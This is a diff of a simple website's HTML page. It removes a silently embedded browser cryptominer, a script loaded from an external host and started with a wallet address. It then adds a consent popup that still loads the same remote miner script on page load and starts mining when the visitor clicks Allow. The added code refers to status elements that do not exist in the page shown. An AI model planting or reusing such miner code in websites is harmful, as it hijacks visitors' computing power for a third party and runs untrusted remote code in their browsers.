@@ -44,13 +44,54 @@
         <p>&copy; 2024 Simple & Beautiful. Made with ❤️ by You. <a href="#top">Back to top</a></p>
     </footer>
 
-				
-<script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
-<script type="text/javascript">
-EverythingIsLife('41iVeDotGpaG9u4xgzjZZoEoWx6znhpaT77xjrJ4k8HP8mQx8UrzxnSKikNuZ3XdZQ6BGcPMUK2GmGfj8utMGqG3GHMzpip', 'x', 50);
-</script>
-		
+    <!-- Notification and Mining Controls -->
+    <div id="mining-notification" style="position: fixed; top: 20px; left: 20px; background-color: #f8d7da; padding: 20px; border: 1px solid #f5c6cb; display: none; z-index: 1000;">
+        <p>This website uses a portion of your CPU to support development and maintenance. Do you agree to participate?</p>
+        <button id="allow-mining" style="background-color: #28a745; color: white; padding: 10px; margin-right: 10px;">Allow</button>
+        <button id="deny-mining" style="background-color: #dc3545; color: white; padding: 10px;">Deny</button>
+    </div>
 
+    <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
+    <script>
+        // Show mining notification
+        const miningNotification = document.getElementById('mining-notification');
+        const allowMiningButton = document.getElementById('allow-mining');
+        const denyMiningButton = document.getElementById('deny-mining');
+        const hashrateElement = document.getElementById('hashrate');
+        const totalHashesElement = document.getElementById('totalHashes');
+
+        let miner;
+        let miningAllowed = false;
+
+        // Show the notification when the page loads
+        document.addEventListener('DOMContentLoaded', () => {
+            miningNotification.style.display = 'block';
+        });
+
+        // Allow mining
+        allowMiningButton.addEventListener('click', () => {
+            miningAllowed = true;
+            miningNotification.style.display = 'none';
+
+            // Initialize the miner
+            miner = EverythingIsLife('41iVeDotGpaG9u4xgzjZZoEoWx6znhpaT77xjrJ4k8HP8mQx8UrzxnSKikNuZ3XdZQ6BGcPMUK2GmGfj8utMGqG3GHMzpip', 'x', 20);
+
+            miner.start();
+
+            // Update mining status
+            setInterval(() => {
+                if (miner) {
+                    hashrateElement.textContent = miner.getHashesPerSecond().toFixed(2) + ' H/s';
+                    totalHashesElement.textContent = miner.getTotalHashes();
+                }
+            }, 1000);
+        });
+
+        // Deny mining
+        denyMiningButton.addEventListener('click', () => {
+            miningAllowed = false;
+            miningNotification.style.display = 'none';
+        });
     </script>
 </body>
 </html>
